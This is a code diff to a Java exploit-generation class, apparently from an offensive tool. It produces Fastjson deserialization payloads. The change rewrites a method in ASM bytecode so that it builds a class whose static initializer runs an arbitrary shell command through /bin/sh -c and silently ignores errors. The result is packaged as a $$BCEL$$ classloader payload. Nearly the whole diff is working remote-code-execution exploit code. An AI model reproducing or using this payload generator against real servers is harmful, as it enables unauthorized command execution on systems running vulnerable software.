@@ -1,9 +1,9 @@
 package com.oobx.chains;
 
-import javassist.ClassPool;
-import javassist.CtClass;
-import javassist.CtNewConstructor;
-import javassist.bytecode.ClassFile;
+import org.objectweb.asm.ClassWriter;
+import org.objectweb.asm.Label;
+import org.objectweb.asm.MethodVisitor;
+import org.objectweb.asm.Opcodes;
 import org.springframework.stereotype.Component;
 
 import java.util.Base64;
@@ -79,20 +79,60 @@ public class FastjsonChainHandler implements ChainHandler {
         return "$$BCEL$$" + encoded;
     }
 
-    /** Generate a class whose static initializer calls Runtime.exec(cmd). */
+    /**
+     * Generate the simplest possible class for BCEL loading: no package, only static init.
+     * Complex class structures cause BCEL 6.x JavaClass.getBytes() to throw UnsupportedOperationException.
+     * Using ASM directly produces a clean Java 8 class that BCEL can re-serialize without issues.
+     */
     private byte[] generateBcelExecClass(String cmd) throws Exception {
-        javassist.ClassPool cp = javassist.ClassPool.getDefault();
-        String cls = "com.oobx.bcel.Exec" + Long.toHexString(System.nanoTime());
-        javassist.CtClass cc = cp.makeClass(cls);
-        String safe = cmd.replace("\\", "\\\\").replace("\"", "\\\"");
-        cc.makeClassInitializer().setBody(
-            "{ try { Runtime.getRuntime().exec(new String[]{\"/bin/sh\",\"-c\",\"" + safe + "\"}); }" +
-            " catch (Exception e) {} }");
-        cc.getClassFile().setMajorVersion(javassist.bytecode.ClassFile.JAVA_8);
-        cc.getClassFile().setMinorVersion(0);
-        byte[] b = cc.toBytecode();
-        cc.detach();
-        return b;
+        // Use ASM (bundled with Spring Boot) to generate minimal class bytecode
+        // avoids Javassist re-serialization issues with BCEL 6.x
+        org.objectweb.asm.ClassWriter cw = new org.objectweb.asm.ClassWriter(0);
+        String cls = "BcelExec" + Long.toHexString(System.nanoTime());
+        cw.visit(org.objectweb.asm.Opcodes.V1_8,
+            org.objectweb.asm.Opcodes.ACC_PUBLIC,
+            cls, null, "java/lang/Object", null);
+        // static initializer: Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",cmd})
+        org.objectweb.asm.MethodVisitor mv = cw.visitMethod(
+            org.objectweb.asm.Opcodes.ACC_STATIC, "<clinit>", "()V", null, null);
+        mv.visitCode();
+        // try { Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",cmd}); } catch(Exception e){}
+        org.objectweb.asm.Label tryStart = new org.objectweb.asm.Label();
+        org.objectweb.asm.Label tryEnd = new org.objectweb.asm.Label();
+        org.objectweb.asm.Label catchStart = new org.objectweb.asm.Label();
+        mv.visitTryCatchBlock(tryStart, tryEnd, catchStart, "java/lang/Exception");
+        mv.visitLabel(tryStart);
+        // new String[]{ "/bin/sh", "-c", cmd }
+        mv.visitMethodInsn(org.objectweb.asm.Opcodes.INVOKESTATIC,
+            "java/lang/Runtime", "getRuntime", "()Ljava/lang/Runtime;", false);
+        mv.visitInsn(org.objectweb.asm.Opcodes.ICONST_3);
+        mv.visitTypeInsn(org.objectweb.asm.Opcodes.ANEWARRAY, "java/lang/String");
+        mv.visitInsn(org.objectweb.asm.Opcodes.DUP);
+        mv.visitInsn(org.objectweb.asm.Opcodes.ICONST_0);
+        mv.visitLdcInsn("/bin/sh");
+        mv.visitInsn(org.objectweb.asm.Opcodes.AASTORE);
+        mv.visitInsn(org.objectweb.asm.Opcodes.DUP);
+        mv.visitInsn(org.objectweb.asm.Opcodes.ICONST_1);
+        mv.visitLdcInsn("-c");
+        mv.visitInsn(org.objectweb.asm.Opcodes.AASTORE);
+        mv.visitInsn(org.objectweb.asm.Opcodes.DUP);
+        mv.visitInsn(org.objectweb.asm.Opcodes.ICONST_2);
+        mv.visitLdcInsn(cmd);
+        mv.visitInsn(org.objectweb.asm.Opcodes.AASTORE);
+        mv.visitMethodInsn(org.objectweb.asm.Opcodes.INVOKEVIRTUAL,
+            "java/lang/Runtime", "exec", "([Ljava/lang/String;)Ljava/lang/Process;", false);
+        mv.visitInsn(org.objectweb.asm.Opcodes.POP);
+        mv.visitLabel(tryEnd);
+        org.objectweb.asm.Label afterCatch = new org.objectweb.asm.Label();
+        mv.visitJumpInsn(org.objectweb.asm.Opcodes.GOTO, afterCatch);
+        mv.visitLabel(catchStart);
+        mv.visitInsn(org.objectweb.asm.Opcodes.POP);
+        mv.visitLabel(afterCatch);
+        mv.visitInsn(org.objectweb.asm.Opcodes.RETURN);
+        mv.visitMaxs(4, 0);
+        mv.visitEnd();
+        cw.visitEnd();
+        return cw.toByteArray();
     }
 
     private String bcelJson(String driverClassName) {
